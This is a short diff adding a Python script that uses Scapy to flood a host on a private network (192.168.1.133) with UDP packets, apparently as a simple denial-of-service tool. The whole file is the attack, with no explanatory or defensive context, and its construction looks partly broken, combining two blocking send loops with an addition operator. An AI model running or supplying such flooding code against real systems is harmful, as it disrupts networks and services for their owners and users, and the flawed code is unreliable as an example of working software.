@@ -1,0 +1,5 @@
+from scapy.all import *
+def UDPflood(ip):
+    UDPflood=IP(dst=(ip))/UDP()
+    srpflood(UDPflood)+srploop(UDPflood)
+UDPflood("192.168.1.133")
